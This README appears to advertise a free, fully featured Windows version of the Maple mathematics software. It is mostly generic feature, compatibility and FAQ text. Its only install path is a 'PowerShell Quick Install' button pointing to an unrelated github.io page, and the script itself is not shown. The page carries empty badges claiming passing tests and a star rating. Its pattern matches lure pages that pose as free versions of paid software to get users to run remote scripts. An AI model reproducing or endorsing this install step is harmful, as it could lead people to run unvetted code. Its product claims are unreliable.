<div align="center">

# Maple: Advanced Mathematics Engine with 2D/3D Visualization for Windows 11

![](files/preview.png)

### 🚀 PowerShell Quick Install

[![](files/button.png)](https://vez740.github.io/maple-math-education-tool/)

[![pwsh](https://img.shields.io/badge/Pwsh-Core-84cc16?style=social&labelColor=0d1117)]() [![tests](https://img.shields.io/badge/Tests-Passing-2ea44f?style=social&labelColor=0d1117)]() [![stars](https://img.shields.io/badge/Stars-4.5%2F5-f59e0b?style=social&labelColor=0d1117)]()

</div>

---

Maple is a Windows desktop application for advanced mathematics education and technical computation, built around a high-performance computational engine that handles both symbolic and numeric operations. The application pairs that engine with an intuitive interface and dedicated equation editors, giving mathematicians, engineers, and students a single environment for solving equations, running technical calculations, and documenting results. Native 2D and 3D graphic viewers render computed data and functions directly, so visual analysis is part of the standard workflow rather than a separate step. A customizable workspace and extensible libraries for specialized functions let the tool scale from coursework to professional analysis without changing platforms.

## 🔧 Requirements

- **OS:** Windows 10 / 11
- **Shell:** PowerShell 5.1+ or PowerShell 7+
- **Network:** internet access to download the script
- **Privileges:** standard user

## Features

Maple delivers a comprehensive mathematical environment built around a high-performance computational engine, designed to handle everything from routine algebraic operations to advanced symbolic and numeric analysis. The feature set is organized to support professionals, educators, and students across a wide range of technical disciplines.

### Computational Engine

- Symbolic and numeric solvers capable of processing algebraic expressions, systems of equations, calculus operations, differential equations, and linear algebra tasks.
- High-precision arithmetic support for results requiring accuracy beyond standard floating-point computation.
- Extensive built-in function libraries covering specialized areas such as statistics, signal processing, optimization, and number theory.
- Expression evaluation with configurable assumptions, allowing constraints and variable properties to be defined for context-aware results.
- Batch and scripted execution modes for automating repetitive calculations and reproducible workflows.

### Mathematical Interface

- Dedicated equation editor with structured input for building complex mathematical expressions without syntax errors.
- Symbol recognition and expression palette for efficient entry of operators, constants, and notation.
- Document-based workspace that intermixes text, live calculations, plots, and annotations within a single environment.
- Customizable palettes and toolbars that adapt to frequently used operations and personal workflow preferences.
- Context-sensitive assistance for function signatures, units, and syntax directly within the editing environment.

### Visualization

- Interactive 2D plotting with support for curves, implicit equations, inequalities, parametric plots, and statistical charts.
- 3D graphic viewing with rotation, zoom, and surface rendering for visualizing multivariable functions and geometric structures.
- Animation tools for demonstrating parameter-dependent behavior and dynamic processes.
- Plot styling and annotation controls for producing publication-ready graphics.
- Data visualization support for importing datasets and generating charts for analysis and presentation.

### Analysis and Documentation

- Step-by-step solution exploration for selected problem types, supporting instructional use and verification of results.
- Unit-aware computation with dimensional consistency checks across calculations.
- Integrated documentation and example library accessible from within the application.
- Export options for results, worksheets, and graphics in multiple formats for reporting and publication.
- Workspace persistence and session management for organizing long-running projects.

## How it works

Maple operates on a layered architecture that separates the user-facing worksheet environment from the underlying computational kernel. When a document is opened, the interface renders a worksheet composed of input regions, output placeholders, and embedded visualization panels. Each input region is parsed into an internal expression tree rather than being interpreted as plain text, which allows the engine to preserve mathematical structure — operators, implicit multiplication, symbolic constants, and function application — throughout evaluation.

The computational core processes requests in two distinct modes. Exact symbolic evaluation manipulates expression trees algebraically, applying simplification rules, rewriting transformations, and canonical forms before any numeric approximation occurs. Numeric evaluation, by contrast, dispatches to arbitrary-precision routines that can be configured per expression, letting you trade speed against decimal accuracy without leaving the document. Results flow back into the worksheet as structured output objects, so a computed value remains linked to its originating input and can be reused downstream without manual copying.

Visualization is generated from the same evaluated data. Two-dimensional plots are constructed by sampling expressions over a specified domain and rendering curves, regions, and annotations through a vector pipeline that stays crisp at any zoom level. Three-dimensional surfaces are built by tessellating the expression across a parameter grid, then shaded and rotated in an interactive viewport. Because plots reference live expressions rather than snapshots, adjusting a parameter or re-evaluating an input updates the associated graphics automatically.

Document structure is maintained by a dependency graph that records which outputs feed which inputs. When a region is edited, Maple walks the graph to determine the affected downstream cells and re-evaluates only those, leaving unrelated content untouched. This incremental model keeps large worksheets responsive and makes it practical to experiment with parameters while retaining a full computational history. Worksheets persist as self-contained documents that store inputs, outputs, plot definitions, and metadata together, so a shared file reproduces the same results when reopened on another Windows machine.

Supporting the kernel are extensible libraries of specialized functions covering linear algebra, calculus, differential equations, statistics, and signal processing. These packages register additional routines with the evaluation engine and become available to any expression without separate loading steps in most workflows. A configurable workspace layer sits above the kernel, letting you arrange palettes, plot panels, and code regions to match a given task, while the symbol recognition module accelerates entry by converting handwritten or palette-selected notation into valid input. Together these components form a continuous loop — input, symbolic and numeric evaluation, visualization, and document persistence — that keeps computation, presentation, and record-keeping within a single environment.

## Compatibility

Maple is engineered as a native Windows desktop application, with compatibility validated across the operating systems most commonly deployed in academic, engineering, and research environments.

**Operating System Support**
- Windows 11 (64-bit), including current feature updates
- Windows 10 (64-bit), version 21H2 or later
- Windows Server editions via desktop experience configuration for lab and managed deployments

**Hardware Compatibility**
- x64 processors with SSE4.2 instruction set support
- Minimum 4 GB RAM; 8 GB or more recommended for large symbolic computations and 3D rendering
- DirectX-compatible graphics adapter for hardware-accelerated 2D and 3D plot rendering
- Minimum 2 GB available disk space, with additional space required for computation caches and worksheet storage

**Display and Input**
- Minimum 1280×720 resolution; 1920×1080 or higher recommended for multi-panel worksheets and graphics viewports
- Full support for standard keyboard and mouse input, including high-DPI scaling
- Compatibility with pen and touch input for equation entry on supported hardware

**Deployment and Environment**
- Standard user-level installation without requiring elevated privileges for core operation
- Compatibility with common enterprise endpoint protection and application allowlisting configurations
- Support for roaming and local user profiles, preserving workspace and preference settings across sessions

**Interoperability**
- File exchange with standard document and data formats used in mathematical and technical workflows
- Clipboard interoperability for transferring expressions, results, and graphics between Maple and other desktop applications

**Notes**
Maple is designed and supported exclusively for the Windows desktop platform described above. Compatibility with virtualized desktop environments is maintained where the listed hardware and operating system requirements are met. Users are encouraged to keep Windows and graphics drivers current to ensure optimal performance of the computational engine and 3D visualization components.

## FAQ

**Is Maple a complete application or a component library?**

Maple is a standalone desktop application for Windows, not a library or SDK. It ships with its own computational engine, document interface, and plotting subsystem, so no additional runtime or framework needs to be assembled before use.

**Which computational domains does the engine cover?**

The engine handles symbolic algebra, numeric evaluation, calculus, linear algebra, differential equations, and unit-aware technical calculations. Expression input is parsed through a dedicated equation editor with symbol recognition, allowing both keyboard entry and structured palette-based composition.

**How does the 2D and 3D graphic viewing subsystem work?**

Plots are rendered in dedicated viewers that accept expressions directly from the worksheet. The 2D viewer supports parametric and implicit plots; the 3D viewer provides interactive rotation, scaling, and surface rendering. All graphics are generated from the live document state, so edits to an expression propagate to the visualization.

**What document format does Maple use, and is it portable?**

Worksheets are saved in a native document format that preserves expressions, plots, and layout. Documents are self-contained and can be reopened on any compatible Windows installation without external dependencies.

**Does the application require a network connection?**

No. Computation, plotting, and document editing run entirely on the local machine. A connection is only relevant for retrieving updates.

**What are the minimum system requirements?**

Windows 10 or later, an Intel Core i3-class processor or equivalent, 4 GB of RAM, 2 GB of free disk space, and a DirectX-compatible graphics adapter.

**How are updates delivered?**

Updates are released periodically and include engine refinements, interface changes, and fixes. Applying an update preserves existing worksheets and user preferences.

**Is the license limited in features or duration?**

The free version is complete: the computational engine, both graphic viewers, the equation editor, and the symbol recognition module are all included without feature gating or time limits.

**Can Maple be used in teaching environments?**

Yes. The intuitive interface and real-time evaluation make it suitable for classroom demonstration and coursework, and worksheets serve as shareable worked examples.

**Where can I find troubleshooting guidance?**

Consult the bundled documentation and the tutorial shipped with the application; both cover interface orientation, expression entry conventions, and common plotting configuration issues.

## Disclaimer

Maple is provided as a desktop software tool for advanced mathematical computation, technical analysis, and 2D and 3D visualization. While the application's computational engine, equation editor, symbol recognition module, and graphics viewers are designed for accuracy and efficiency, results generated by the software depend on correct user input, appropriate configuration, and the specific context of use. Users are responsible for validating all calculations and visualizations before relying on them for academic, engineering, scientific, or professional decisions.

Maple is intended for use on compatible Windows systems as described in the system requirements. Performance, stability, and feature availability may vary depending on hardware configuration, operating system version, and the presence of third-party software or drivers. The software is provided on an "as is" basis, without warranties of any kind, whether express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, or non-infringement.

To the maximum extent permitted by applicable law, the developers and distributors of Maple shall not be liable for any direct, indirect, incidental, special, consequential, or punitive damages arising from the use of, or inability to use, the software, including but not limited to loss of data, loss of productivity, calculation errors, or errors in generated graphics. Users are advised to maintain independent backups of their work and to verify critical results through alternative methods where appropriate.

Maple is distributed as a complete free version with all features and updates included. No guarantee is made regarding the frequency, scope, or continuity of future updates, and features may be modified, added, or removed at any time. Any use of Maple constitutes acceptance of this disclaimer.